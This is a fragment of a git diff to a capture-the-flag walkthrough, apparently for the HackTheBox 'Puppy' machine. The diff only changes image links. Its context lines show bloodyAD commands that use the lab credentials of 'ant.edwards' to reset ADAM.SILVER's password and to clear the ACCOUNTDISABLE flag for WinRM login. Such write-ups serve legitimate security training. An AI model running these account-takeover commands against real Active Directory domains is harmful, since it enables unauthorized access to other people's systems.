@@ -279,7 +279,7 @@ SMB         10.10.11.70     445    DC               [-] PUPPY.HTB
 ```bash
 bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set password ADAM.SILVER Thebestpass0!
 ```
-![image.png](image%2010.png)
+![](MediaFiles/Pasted%20image%2020250927224909.png)
 
 great, it was successful, and there are the new creds of adam silver
 ```bash
@@ -296,7 +296,7 @@ BUT tried logging in via winrm, and no luck! WHY?
 ```bash
 bloodyAD --host DC.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE
 ```
-![image.png](image%2011.png)
+![](MediaFiles/Pasted%20image%2020250927224929.png)
 
 nice, now that it is enabled, lets try the user's creds:
 ```bash
